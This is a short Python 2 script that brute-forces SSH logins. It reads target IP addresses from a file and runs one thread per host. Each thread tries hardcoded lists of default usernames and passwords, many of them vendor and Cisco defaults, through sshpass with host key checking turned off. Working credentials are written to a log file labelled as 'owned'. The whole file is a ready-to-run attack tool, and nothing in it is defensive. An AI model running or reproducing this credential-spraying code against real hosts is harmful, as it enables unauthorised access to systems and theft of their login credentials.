
import threading
import commands, os

BLUE = '\033[94m'
BOLD = '\033[1m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
ENDC = '\033[0m'

listaip = file("listaip.txt", "r")
user  = ["anonymous","ftp","admin","user","bunkercl","hsa","root","factory","netrangr","wlseuser","wlse","cusadmin","username","cisco","Cisco","administrator","restore","Administrator","bbsd-client","cmaker"]
passw = ["conf","admin","user","fibranne","bunkercl","password","hsadb","root","shuntang","wlseuser","wlsedb","cisco","changeme2","attack","Cisco","restoreDefaultPassword","cmaker","Symbol","superuser","changeme","blender","diamond"]

def ipslista(ip):
	print BLUE+"\n SSH Test Run... "+ip+ENDC
	for u in user:
		for p in passw:
			try:
				print ' '+str(ip)+'->'+str(u)+':'+str(p)
				ssh = commands.getoutput('sshpass -p '+str(p)+' ssh -o StrictHostKeyChecking=no '+str(u)+'@'+str(ip)+' echo "Lol"')
				if ssh == 'Lol':
					print BOLD+"\n SSH Access Successful"+ENDC
					print YELLOW+" Cred: "+ENDC+GREEN+str(ip)+'|'+str(u)+':'+str(p)+'\n'+ENDC
					owned=open('sshcred.log','a')
					owned.write('\n-------\nIP: '+str(ip) + '\nUSER: ' + str(u) + '\nPASS: ' + str(p))
					owned.close()
			except Exception:
				pass

threads = list()
for ip in listaip:
	ip = ip.rstrip()
	t = threading.Thread(target=ipslista, name='Hilos', args=(ip,))
	threads.append(t)
	t.start()